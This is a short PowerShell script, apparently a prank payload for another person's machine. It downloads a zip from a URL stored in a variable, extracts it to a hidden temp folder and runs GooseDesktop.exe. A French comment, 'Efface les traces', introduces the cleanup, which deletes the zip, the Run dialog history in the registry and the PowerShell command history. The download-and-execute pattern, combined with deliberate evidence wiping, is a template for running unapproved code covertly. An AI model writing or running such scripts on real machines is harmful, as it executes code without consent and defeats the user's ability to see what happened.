Invoke-WebRequest -URI "$lk" -OutFile $env:TEMP\goose.zip
Expand-Archive -Path $env:TEMP\goose.zip -DestinationPath $env:TEMP\sinfbgqsyugfezlampokqs
$goose = $env:TEMP + "\sinfbgqsyugfezlampokqs\GooseDesktop.exe"
Invoke-Expression $goose

# Efface les traces
Remove-item -path $env:TEMP\goose.zip
Remove-Item -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
Remove-Item (Get-PSreadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
clear
exit